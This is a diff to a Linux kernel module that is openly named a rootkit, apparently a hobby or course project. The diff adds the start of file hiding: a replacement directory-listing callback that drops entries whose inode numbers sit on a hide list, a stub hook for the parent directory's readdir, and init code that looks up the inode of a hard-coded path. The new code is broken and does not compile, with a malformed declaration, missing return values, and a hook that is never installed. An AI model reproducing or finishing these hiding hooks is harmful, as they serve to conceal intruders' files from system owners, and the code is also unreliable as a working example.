@@ -2,6 +2,9 @@
 #include <linux/kernel.h>	/* Needed for KERN_INFO */
 #include <linux/init.h>		/* Needed for the macros */
 #include <linux/fs.h>
+#include <linux/namei.h>
+#include <linux/path.h>
+#include <linux/mount.h>
 #include <asm/uaccess.h>
 
 #include "rootkit.h"
@@ -68,7 +71,6 @@ static int device_open(struct inode* inode, struct file* file){
     return -EBUSY;
   
   device_open_num++;
-  // sprintf(msg, "What is in the buffer: %s\n", msg);
   msg_ptr = msg;
   try_module_get(THIS_MODULE);
   return SUCCESS;
@@ -84,9 +86,9 @@ static int device_release(struct inode *inode, struct file *file)
 }
 
 static ssize_t device_ioctl(	/* see include/linux/fs.h */
-		 struct file *file,	/* ditto */
-		 unsigned int ioctl_num,	/* number and param for ioctl */
-		 unsigned long ioctl_param)
+			    struct file *file,	/* ditto */
+			    unsigned int ioctl_num,	/* number and param for ioctl */
+			    unsigned long ioctl_param)
 {
   int i;
   char *temp;
@@ -128,64 +130,99 @@ static ssize_t device_ioctl(	/* see include/linux/fs.h */
     break;
 
   case IOCTL_GET_NTH_BYTE:
-    /* 
-     * This ioctl is both input (ioctl_param) and 
-     * output (the return value of this function) 
-     */
     return msg[ioctl_param];
     break;
   }
 
   return SUCCESS;
 }
+/***************************************************************************/
+
+
+struct dentry* g_parent_dentry;
+
+int g_inode_count = 0;
+unsigned long* g_inode_numbers;
+filldir_t real_filldir;
+
+static int new_filldir (void *buf,
+			const char *name,
+			int namelen,
+			loff_t offset,
+			u64 ux64,
+			unsigned ino){
+  unsigned int i = 0;
+  struct dentry* = p_dentry;
+  struct qstr current_name;
+  current_name.name = name;
+  current_name.len = namelen;
+  current_name.hash = full_name_hash (name, namelen);
+
+  p_dentry = d_lookup(g_parent_dentry, &current_name);
+
+  if (p_dentry!=NULL){
+    for(i = 0; i<= g_inode_count - 1; i++){
+      if (g_inode_numbers[i] == p_dentry->d_inode->i_ino)
+	return 0;
+    }
+  }
+}
+static int new_parent_readdir(struct file* file,
+			      void* dirent,
+			      filldir_t filldir){
+  g_parent_dentry = file->f_dentry;
+  real_filldir = filldir;
+  return  ;
+}
+
+
 
 
 struct file_operations fops ={
-				     .read = device_read
-				     , .write = device_write
-				     , .unlocked_ioctl = device_ioctl
-				     , .open = device_open
-				     , .release = device_release
-				     
+			      .read = device_read
+			      , .write = device_write
+			      , .unlocked_ioctl = device_ioctl
+			      , .open = device_open
+			      , .release = device_release				     
 };
+static char* path_name = "/home/dalo2903/test.c";
 
 // Rootkit init & exit
 static int __init rootkit_init(void)
 {
-  int ret_val;
-  
-  /* 
-   * Register the character device (atleast try) 
-   */
-  ret_val = register_chrdev(MAJOR_NUM, DEVICE_NAME, &fops);
-
-  /* 
-   * Negative values signify an error 
-   */
-  if (ret_val < 0) {
+ 
+  struct inode *inode;
+  struct path path;
+  kern_path(path_name, LOOKUP_FOLLOW, &path);
+  inode = path.dentry->d_inode;
+  printk("Path name : %s, inode :%lu\n", path_name, inode->i_ino);
+  return 0;
+  /*
+    int ret_val;
+    ret_val = register_chrdev(MAJOR_NUM, DEVICE_NAME, &fops);
+    if (ret_val < 0) {
     printk(KERN_ALERT "%s failed with %d\n",
-	   "Sorry, registering the character device ", ret_val);
+    "Sorry, registering the character device ", ret_val);
     return ret_val;
-  }
+    }
 
-  printk(KERN_INFO "%s The major device number is %d.\n",
-	 "Registeration is a success", MAJOR_NUM);
-  printk(KERN_INFO "If you want to talk to the device driver,\n");
-  printk(KERN_INFO "you'll have to create a device file. \n");
-  printk(KERN_INFO "We suggest you use:\n");
-  printk(KERN_INFO "mknod %s c %d 0\n", DEVICE_FILE_NAME, MAJOR_NUM);
-  printk(KERN_INFO "The device file name is important, because\n");
-  printk(KERN_INFO "the ioctl program assumes that's the\n");
-  printk(KERN_INFO "file you'll use.\n");
-  sprintf(msg, "Starting text\n");
+    printk(KERN_INFO "%s The major device number is %d.\n",
+    "Registeration is a success", MAJOR_NUM);
+    printk(KERN_INFO "If you want to talk to the device driver,\n");
+    printk(KERN_INFO "you'll have to create a device file. \n");
+    printk(KERN_INFO "We suggest you use:\n");
+    printk(KERN_INFO "mknod %s c %d 0\n", DEVICE_FILE_NAME, MAJOR_NUM);
+    sprintf(msg, "Starting text\n");*/
   return 0;
 }
+
 static void __exit rootkit_exit(void)
-{
-  /*int ret =*/ unregister_chrdev(MAJOR_NUM, DEVICE_NAME);
-  //if (ret < 0)
-  //    	printk(KERN_ALERT "Error in unregister_chrdev: %d\n", ret);
-  printk(KERN_INFO "Rootkit unloaded\n");
+{/*
+   unregister_chrdev(MAJOR_NUM, DEVICE_NAME);
+  
+   printk(KERN_INFO "Rootkit unloaded\n");
+ */
+  return;
 }
 
 module_init(rootkit_init);
